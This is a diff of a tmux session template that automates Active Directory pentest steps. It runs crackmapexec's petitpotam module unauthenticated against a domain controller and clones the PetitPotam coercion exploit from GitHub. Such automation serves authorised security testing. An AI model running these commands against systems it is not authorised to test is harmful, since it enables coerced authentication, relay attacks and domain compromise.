@@ -91,7 +91,7 @@ windows:
       panes:
         - cme petit:
           - tmux select-pane -T 'cme petit' -t "unauthd:coercAuth.0"
-          - crackmapexec smb $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -u '' -p '' -d <%= @settings["domain"] %> -M petitpotam | tee <%= @settings["rootDir"] %>/scans/petitpotam-unauthd.txt
+          - crackmapexec smb <%= @settings["rootDir"] %>/dcIP.txt -u '' -p '' -d <%= @settings["domain"] %> -M petitpotam | tee <%= @settings["rootDir"] %>/scans/petitpotam-unauthd.txt
         - PetitPotam.py:
           - tmux select-pane -T 'PetitPotam.py' -t "unauthd:coercAuth.1"
           - cd <%= @settings["toolDir"] %>/PetitPotam || git clone https://github.com/topotam/PetitPotam.git <%= @settings["toolDir"] %>/PetitPotam && cd <%= @settings["toolDir"] %>/PetitPotam
